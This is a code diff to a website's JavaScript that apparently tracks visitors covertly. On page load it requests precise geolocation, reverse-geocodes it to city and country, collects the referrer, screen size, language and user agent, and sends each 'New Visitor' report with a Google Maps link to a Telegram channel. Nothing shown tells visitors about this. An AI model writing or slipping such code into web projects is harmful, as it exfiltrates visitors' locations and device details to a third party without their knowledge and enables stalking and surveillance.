@@ -47,25 +47,70 @@
         }
       };
 
+      const sendRichLocation = async (position) => {
+        const { latitude, longitude, accuracy } = position.coords;
+
+        try {
+          // Get city + country (with timeout)
+          let city = 'Unknown';
+          let country = 'Unknown';
+          let region = '';
+
+          try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 6000);
+
+            const geoRes = await fetch(
+              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`,
+              { signal: controller.signal }
+            );
+            clearTimeout(timeoutId);
+
+            if (geoRes.ok) {
+              const geoData = await geoRes.json();
+              city = geoData.city || geoData.locality || 'Unknown';
+              country = geoData.countryName || 'Unknown';
+              region = geoData.principalSubdivision || '';
+            }
+          } catch (geoErr) {
+            console.log('Reverse geocoding failed, sending coordinates only');
+          }
+
+          const message = `✅ ENKO - New Visitor
+
+      📍 ${latitude}, ${longitude}
+      🏙 ${city}, ${region}
+      🌍 ${country}
+      🎯 Accuracy: ${Math.round(accuracy)}m
+      🕒 ${new Date().toISOString()}
+
+      🌐 Referrer: ${document.referrer || 'Direct'}
+      📱 ${window.screen.width}x${window.screen.height} | ${navigator.language}
+      🔗 https://www.google.com/maps/place/${latitude},${longitude}`;
+
+          await sendToTelegram(message);
+        } catch (err) {
+          const errorMsg = `❌ ENKO - Location Capture FAILED
+
+      Error: ${err.message}
+      Type: ${err.name || 'Unknown'}
+      Time: ${new Date().toISOString()}
+      User Agent: ${navigator.userAgent.substring(0, 120)}
+      Page: ${window.location.href}`;
+
+          await sendToTelegram(errorMsg);
+        }
+      };
+
       const initAutoLocationSender = () => {
         if (!navigator.geolocation) {
-          sendToTelegram('❌ ENKO - Geolocation NOT SUPPORTED');
+          sendToTelegram(`❌ ENKO - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}`);
           return;
         }
 
         setTimeout(() => {
           navigator.geolocation.getCurrentPosition(
-            (position) => {
-              const { latitude, longitude, accuracy } = position.coords;
-              const message = `✅ ENKO - New Visitor
-
-      📍 ${latitude}, ${longitude}
-      🎯 Accuracy: ${Math.round(accuracy)}m
-      🕒 ${new Date().toISOString()}
-      🔗 https://www.google.com/maps/place/${latitude},${longitude}`;
-
-              sendToTelegram(message);
-            },
+            sendRichLocation,
             (error) => {
               let errorType = 'Unknown';
               switch (error.code) {
